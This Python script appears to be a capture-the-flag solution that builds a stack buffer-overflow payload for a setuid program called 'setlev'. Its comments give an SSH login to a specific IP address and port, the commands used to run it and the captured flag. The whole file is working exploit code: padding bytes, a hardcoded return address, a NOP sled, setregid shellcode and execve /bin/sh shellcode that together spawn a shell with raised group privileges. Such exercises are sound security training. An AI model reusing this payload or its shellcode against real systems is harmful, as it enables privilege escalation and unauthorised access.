#!/usr/bin/env python

import sys

# ssh setlev@143.248.38.212 -p 10000
# ./hex2binary.py > payload
# ./setlev --level=$(cat /tmp/hcy_setlev/payload)

# flag: SKCTF{50l0_l3v3l1n6_0w0}

# random 8 + 4 bytes (local variable 8 byte + EBP 4 bytes) == random 12 bytes
random_bytes = "\x41" * 12

# redirection address written on address space...
# where the return address of parseAndFunction resides
return_address = "\x1a\xdd\xff\xff"

# NOP Sled
nop_sled = "\x90" * 512

# setregid
setregid_hex = "\x31\xDB\x66\xBB\xEC\x03\x31\xC9\x66\xB9\xEC\x03\x31\xC0\xB0\x47\xCD\x80"

# # bin_sh.s
bin_sh_hex = "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC0\x50\x53\x89\xE1\x31\xD2\xB0\x0B\xCD\x80"

payload = random_bytes + return_address + nop_sled + setregid_hex + bin_sh_hex

sys.stdout.write(payload)
